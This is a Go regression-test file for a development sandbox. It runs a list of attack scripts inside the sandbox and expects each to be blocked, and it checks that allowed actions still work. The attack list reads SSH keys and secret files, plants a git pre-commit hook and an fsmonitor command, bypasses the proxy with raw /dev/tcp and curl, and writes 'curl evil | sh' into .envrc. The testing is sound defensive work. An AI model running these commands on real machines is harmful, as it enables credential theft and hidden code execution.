// Sandbox regression tests (DESIGN.md §9 test/attack): each attack runs
// inside the A sandbox, with the real policy, as if B were compromised. Every
// attack must fail. Positive controls make sure a failure is the policy's
// doing and not a broken test.
package attack

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"waldo/test/harness"
)

func listen(t *testing.T) (int, func()) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			c.Write([]byte("HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nok"))
			c.Close()
		}
	}()
	return ln.Addr().(*net.TCPAddr).Port, func() { ln.Close() }
}

func sandboxRun(e *harness.Env, script string) (int, string) {
	cmd := e.Cmd("dev-sandbox", "--", "bash", "-c", script)
	var out bytes.Buffer
	cmd.Stdout, cmd.Stderr = &out, &out
	cmd.Run()
	return cmd.ProcessState.ExitCode(), out.String()
}

func TestAttacks(t *testing.T) {
	harness.Require(t, "curl", "python3")
	e := harness.New(t)
	home, _ := os.UserHomeDir()
	allowedHostPort, stop1 := listen(t)
	defer stop1()
	forbiddenHostPort, stop2 := listen(t)
	defer stop2()
	e.WriteConfig(fmt.Sprintf("[net]\nhost_ports = [%d]\nallow = [\"localhost:%d\"]\n", allowedHostPort, forbiddenHostPort))

	secret := filepath.Join(e.Root, "outside-secret.txt")
	os.WriteFile(secret, []byte("top secret"), 0o600)
	os.MkdirAll(filepath.Join(home, ".ssh"), 0o700)

	// Abstract unix socket on the host (like X11 or a D-Bus session bus).
	abs, err := net.Listen("unix", "@waldo-attack-test")
	if err != nil {
		t.Fatal(err)
	}
	defer abs.Close()
	go func() {
		for {
			c, err := abs.Accept()
			if err != nil {
				return
			}
			c.Close()
		}
	}()

	attacks := []struct{ name, script string }{
		{"read ~/.ssh", `ls -A ~/.ssh | grep -q . || cat ~/.ssh/authorized_keys`},
		{"read file outside project", `cat ` + secret},
		{"read waldo config", `cat ` + filepath.Join(e.AConfig, "config.toml")},
		{"write waldo allow list", `echo '{"*":["*.com"]}' > ` + filepath.Join(e.AConfig, "allowed.json")},
		{"read audit log", `cat ` + filepath.Join(e.AData, "audit.log")},
		{"write .git/hooks", `echo 'evil' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit`},
		{"write .git/config", `git config core.fsmonitor 'touch /tmp/pwned'`},
		{"replace .git", `mv .git .git-old`},
		{"remove .git/hooks", `rm -rf .git/hooks && ! test -e .git/hooks`},
		{"write system dirs", `touch /usr/bin/evil || touch /etc/evil`},
		{"undeclared host port", fmt.Sprintf(`exec 3<>/dev/tcp/127.0.0.1/%d`, forbiddenHostPort)},
		{"proxy to non-allowed domain", `curl -sf --max-time 10 -o /dev/null https://example.com`},
		{"proxy to host IP", fmt.Sprintf(`curl -sf --max-time 5 -o /dev/null http://127.0.0.1:%d/ --proxy $HTTP_PROXY --noproxy ''`, forbiddenHostPort)},
		{"allowed name resolving to loopback", fmt.Sprintf(`curl -sf --max-time 5 -o /dev/null http://localhost:%d/ --proxy $HTTP_PROXY --noproxy ''`, forbiddenHostPort)},
		{"bypass proxy", `curl -sf --max-time 5 --noproxy '*' -o /dev/null https://1.1.1.1`},
		{"raw DNS", `python3 -c 'import socket; socket.getaddrinfo("github.com", 443)'`},
		{"abstract unix socket", `python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("\0waldo-attack-test")'`},
		{"see host processes", `test "$(ls -d /proc/[0-9]* | wc -l)" -gt 30`},
		{"see host network interfaces", `ip -o link 2>/dev/null | grep -v ' lo:' | grep -q . || grep -qv 'lo:' <(tail -n +3 /proc/net/dev)`},
	}
	for _, a := range attacks {
		code, out := sandboxRun(e, a.script)
		if code == 0 {
			t.Errorf("ATTACK SUCCEEDED: %s\n%s", a.name, out)
		} else {
			t.Logf("blocked: %-36s (exit %d) %s", a.name, code, firstLine(out))
		}
	}
	if b, _ := os.ReadFile(filepath.Join(e.Project, ".git", "config")); strings.Contains(string(b), "fsmonitor") {
		t.Error(".git/config was modified")
	}

	// Positive controls: the same mechanisms work for what is allowed.
	controls := []struct{ name, script string }{
		{"write project file", `echo ok > file.txt && cat file.txt`},
		{"git works", `git status --short >/dev/null && git add file.txt`},
		{"declared host port", fmt.Sprintf(`exec 3<>/dev/tcp/127.0.0.1/%d && echo GET / >&3 && cat <&3 | grep -q ok`, allowedHostPort)},
		{"allowed domain via proxy", `curl -sf --max-time 20 -o /dev/null https://github.com`},
		{"tools from host", `command -v git && command -v python3`},
	}
	for _, c := range controls {
		if code, out := sandboxRun(e, c.script); code != 0 {
			if c.name == "allowed domain via proxy" && os.Getenv("WALDO_TEST_OFFLINE") == "1" {
				continue
			}
			t.Errorf("control failed: %s (exit %d)\n%s", c.name, code, out)
		}
	}
}

func firstLine(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		s = s[:i]
	}
	if len(s) > 90 {
		s = s[:90]
	}
	return s
}

// Well-known ports (databases) inside the sandbox are not forwarded to the
// host, ordinary dev ports are.
func TestPortForwardPolicy(t *testing.T) {
	harness.Require(t, "python3")
	e := harness.New(t)
	if c, err := net.Dial("tcp", "127.0.0.1:5432"); err == nil {
		c.Close()
		t.Skip("something already listens on 5432 on this host")
	}
	dev := harness.FreePort(t)
	cmd := e.Cmd("dev-sandbox", "--", "bash", "-c",
		fmt.Sprintf(`python3 -m http.server %d --bind 127.0.0.1 >/dev/null 2>&1 & python3 -m http.server 5432 --bind 127.0.0.1 >/dev/null 2>&1 & sleep 4`, dev))
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	defer cmd.Wait()
	ok := false
	for i := 0; i < 30 && !ok; i++ {
		time.Sleep(100 * time.Millisecond)
		if c, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", dev)); err == nil {
			c.Close()
			ok = true
		}
	}
	if !ok {
		t.Errorf("dev port %d was not forwarded", dev)
	}
	if c, err := net.Dial("tcp", "127.0.0.1:5432"); err == nil {
		c.Close()
		t.Error("5432 inside the sandbox was forwarded to the host")
	}
}

// Paths that did not exist (so could not be mounted read-only) are checked
// after the session and reported.
func TestProtectedPathWarning(t *testing.T) {
	e := harness.New(t)
	cmd := e.Cmd("dev-sandbox", "--", "bash", "-c", `echo 'curl evil | sh' > .envrc`)
	var out bytes.Buffer
	cmd.Stdout, cmd.Stderr = &out, &out
	cmd.Run()
	if _, err := os.Stat(filepath.Join(e.Project, ".envrc")); err != nil {
		t.Skip(".envrc was not created; nothing to check")
	}
	if !strings.Contains(out.String(), ".envrc") {
		t.Errorf("no warning about new .envrc:\n%s", out.String())
	}
}

func TestSandboxSeesOnlyLoopback(t *testing.T) {
	e := harness.New(t)
	code, out := sandboxRun(e, `cat /proc/net/dev`)
	if code != 0 {
		t.Fatal(out)
	}
	for _, l := range strings.Split(out, "\n")[2:] {
		l = strings.TrimSpace(l)
		if l != "" && !strings.HasPrefix(l, "lo:") {
			t.Errorf("unexpected interface: %s", l)
		}
	}
}
